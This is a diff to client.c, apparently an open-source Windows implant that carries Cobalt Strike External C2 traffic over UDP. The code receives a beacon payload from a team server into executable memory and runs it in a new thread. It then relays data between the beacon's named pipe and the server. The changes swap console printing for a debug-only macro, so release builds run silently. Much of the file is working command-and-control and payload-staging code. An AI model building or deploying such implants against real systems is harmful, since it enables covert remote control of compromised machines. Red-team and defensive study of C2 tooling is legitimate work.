@@ -1,11 +1,8 @@
 /**
  * client.c
- * by Daniel Fitzgerald
- * Jan 2020
+ * by Daniel Fitzgerald and Ian Roberts
  *
- * Program to provide TCP communications for Cobalt Strike using the External C2 feature.
- * 
- * Modified to run UDP by Ian Roberts
+ * Program to provide UDP communications for Cobalt Strike using the External C2 feature.
  */
 
 #pragma once
@@ -31,7 +28,14 @@
 
 // #define SA struct sockaddr
 
+#ifdef DEBUG
+	#define _DEBUG 1
+#else
+	#define _DEBUG 0
+#endif
 
+#define debug_print(fmt, ...) \
+            do { if (_DEBUG) fprintf(stderr, fmt, __VA_ARGS__); } while (0)
 
 static DWORD server_seqnum = 0;
 static DWORD my_seqnum = 0;
@@ -53,7 +57,7 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf("WSAStartup failed with error: %d\n", iResult);
+		debug_print("WSAStartup failed with error: %d\n", iResult);
 		return INVALID_SOCKET;
 	}
 
@@ -67,7 +71,7 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	// Resolve the server address and port
 	iResult = getaddrinfo(ip, port, &hints, &result);
 	if (iResult != 0) {
-		printf("getaddrinfo failed: %d\n", iResult);
+		debug_print("getaddrinfo failed: %d\n", iResult);
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
@@ -75,7 +79,7 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	// Resolve our own address and port
 	iResult = getaddrinfo(my_ip, my_port, &hints, &my_info);
 	if (iResult != 0) {
-		printf("getaddrinfo failed: %d\n", iResult);
+		debug_print("getaddrinfo failed: %d\n", iResult);
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
@@ -87,7 +91,7 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	// Create a SOCKET for connecting to server
 	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf("Error at socket(): %ld\n", WSAGetLastError());
+		debug_print("Error at socket(): %ld\n", WSAGetLastError());
 		freeaddrinfo(result);
 		WSACleanup();
 		return INVALID_SOCKET;
@@ -96,7 +100,7 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	//Bind the socket to the given IP and port
 	iResult = bind(ConnectSocket, my_info->ai_addr, (int) my_info->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
-		printf("Bind Failure: %ld\n", WSAGetLastError());
+		debug_print("Bind Failure: %ld\n", WSAGetLastError());
 		closesocket(ConnectSocket);
 		ConnectSocket = INVALID_SOCKET;
 	}
@@ -104,7 +108,7 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	// Connect to server.
 	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
-		printf("Connection Failure%ld\n", WSAGetLastError());
+		debug_print("Connection Failure: %ld\n", WSAGetLastError());
 		closesocket(ConnectSocket);
 		ConnectSocket = INVALID_SOCKET;
 	}
@@ -113,7 +117,7 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	freeaddrinfo(result);
 
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf("Unable to connect to server!\n");
+		debug_print("%s", "Unable to connect to server!\n");
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
@@ -152,7 +156,7 @@ void sendData(fd_set* sockset, const char* data, DWORD len, struct timeval* time
 	char* packet = calloc(PACKET_SIZE+4, 1);
 	memset(ackpacket, 0, 4);
 	int remaining = len;
-	// printf("Sending %d bytes.\n", len);
+	debug_print("Sending %d bytes.\n", len);
 	while (remaining > 0) {
 		pendingAck = 1;
 		DWORD temp = 0;
@@ -166,12 +170,11 @@ void sendData(fd_set* sockset, const char* data, DWORD len, struct timeval* time
 				temp = send(sd, packet, remaining+4, 0);
 			}
 			timeout_struct->tv_sec = TIMEOUT_SEC; //Timeout must be reset after every select() call
-			// printf("sent: %d bytes\n", temp);
-			// printf("Waiting for ACK\n");
+			debug_print("sent: %d bytes\n", temp);
 			socketsReady = select(0, sockset, NULL, NULL, timeout_struct);
 			if (socketsReady > 0) {
 				recv(sd, ackpacket, 3, 0);
-				// printf("contents of ackpacket: %s\n", ackpacket);
+				debug_print("contents of ackpacket: %s\n", ackpacket);
 				if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) {
 					pendingAck = 0;
 					my_seqnum++;
@@ -203,7 +206,7 @@ void sendData(fd_set* sockset, const char* data, DWORD len, struct timeval* time
 */
 DWORD recvData(fd_set* sockset, char * buffer, DWORD max, struct timeval* timeout_struct) {
 	SOCKET sd = sockset->fd_array[0];
-	// printf("Receiving Data\n");
+	debug_print("%s", "Receiving Data\n");
 	char* sizePacket = malloc(8);
 	DWORD size = 0, total = 0, temp = 0, seqnum = 0;
 
@@ -217,12 +220,12 @@ DWORD recvData(fd_set* sockset, char * buffer, DWORD max, struct timeval* timeou
 				server_seqnum++;							//Note: under this implementation, there is a limit to the number of packets per connection.
 				size = *((DWORD*)(sizePacket + 4));			//Once the sequence number overflows, this breaks. 
 			} else {
-				printf("Received out of order on size packet.\n");
+				debug_print("%s", "Received out of order on size packet.\n");
 			}
 		}
 	}
 
-	// printf("Size: 0x%08x\n", size);
+	debug_print("Size: 0x%08x\n", size);
 
 	char* packet = calloc(PACKET_SIZE+4, 1);
 
@@ -237,11 +240,11 @@ DWORD recvData(fd_set* sockset, char * buffer, DWORD max, struct timeval* timeou
 				memcpy((buffer + total), (packet + 4), temp - 4);
 				total += temp - 4;
 			} else {
-				printf("Received out of order on data packet\n");
+				debug_print("%s", "Received out of order on data packet\n");
 			}
 		}
 		memset(packet, 0, PACKET_SIZE+4);
-		// printf("Total: %08x\n", total);		
+		debug_print("Total: %08x\n", total);		
 	}
 	free(packet);
 	free(sizePacket);
@@ -324,8 +327,8 @@ void main(int argc, char* argv[])
 	// Set connection info
 	if (argc != 7)
 	{
-		printf("Incorrect number of args: %d\n", argc);
-		printf("Incorrect number of args: client.exe [SERVER_IP] [PORT] [PIPE_STR] [CLIENT_IP] [CLIENT_PORT] [SLEEP]");
+		debug_print("Incorrect number of args: %d\n", argc);
+		debug_print("Incorrect number of args: %s [SERVER_IP] [PORT] [PIPE_STR] [CLIENT_IP] [CLIENT_PORT] [SLEEP]", argv[0]);
 		exit(1);
 	}
 
@@ -356,10 +359,10 @@ void main(int argc, char* argv[])
 	sockfd = create_socket(IP, PORT, my_ip, my_port);
 	if (sockfd == INVALID_SOCKET)
 	{
-		printf("Socket creation error!\n");
+		debug_print("%s", "Socket creation error!\n");
 		exit(1);
 	}
-	printf("Socket Created\n");
+	debug_print("%s", "Socket Created\n");
 
 	//Create socket set of 1 socket
 	//This is so we can use the select() function on our socket
@@ -376,28 +379,28 @@ void main(int argc, char* argv[])
 
 	// run 3-way handshake with beacon
 	threeWayHandshake(&sock_set, &timeout_struct);
-	printf("Handshake completed.\n");
+	debug_print("%s", "Handshake completed.\n");
 
 	// Recv beacon payload
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
-		printf("payload buffer malloc failed!\n");
+		debug_print("%s", "payload buffer malloc failed!\n");
 		exit(1);
 	}
 
 	DWORD payload_size = recvData(&sock_set, payload, BUFFER_MAX_SIZE, &timeout_struct);
 	if (payload_size < 0)
 	{
-		printf("recvData error, exiting\n");
+		debug_print("%s", "recvData error, exiting\n");
 		free(payload);
 		exit(1);
 	}
-	printf("Recv %d byte payload from TS\n", payload_size);
+	debug_print("Recv %d byte payload from TS\n", payload_size);
 	/* inject the payload stage into the current process */
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 
-	printf("Thread Created, payload received intact\n");
+	debug_print("%s", "Thread Created, payload received intact\n");
 
 	// Loop unstil the pipe is up and ready to use
 	while (beaconPipe == INVALID_HANDLE_VALUE) {
@@ -410,13 +413,13 @@ void main(int argc, char* argv[])
 		// Full string (i.e. "\\\\.\\pipe\\mIRC")
 		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
 	}
-	printf("Connected to pipe!!\n");
+	debug_print("%s", "Connected to pipe!!\n");
 
 	// Mudge used 1MB max in his example, this may be because SMB beacons are only able to send 1MB of data within each response.
 	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
 	if (buffer == NULL)
 	{
-		printf("buffer malloc failed!\n");
+		debug_print("%s", "buffer malloc failed!\n");
 		free(payload);
 		exit(1);
 	}
@@ -426,30 +429,30 @@ void main(int argc, char* argv[])
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
 		if (read_size < 0)
 		{
-			printf("read_frame error, exiting\n");
+			debug_print("%s", "read_frame error, exiting\n");
 			break;
 		}
-		printf("Recv %d bytes from beacon\n", read_size);
+		debug_print("Recv %d bytes from beacon\n", read_size);
 		
 		if (read_size == 1)
 		{
-			printf("Finished sending, sleeping %d seconds..\n", sleep);
+			debug_print("Finished sending, sleeping %d seconds..\n", sleep);
 			Sleep(sleep*1000);
 		}
 
 		sendData(&sock_set, buffer, read_size, &timeout_struct);
-		printf("Sent to TS\n");
+		debug_print("%s", "Sent to TS\n");
 		
 		read_size = recvData(&sock_set, buffer, BUFFER_MAX_SIZE, &timeout_struct);
 		if (read_size < 0)
 		{
-			printf("recvData error, exiting\n");
+			debug_print("%s", "recvData error, exiting\n");
 			break;
 		}
-		printf("Recv %d bytes from TS\n", read_size);
+		debug_print("Recv %d bytes from TS\n", read_size);
 
 		write_frame(beaconPipe, buffer, read_size);
-		printf("Sent to beacon\n");
+		debug_print("%s", "Sent to beacon\n");
 	}
 	FD_CLR(sockfd, &sock_set);
 	free(payload);
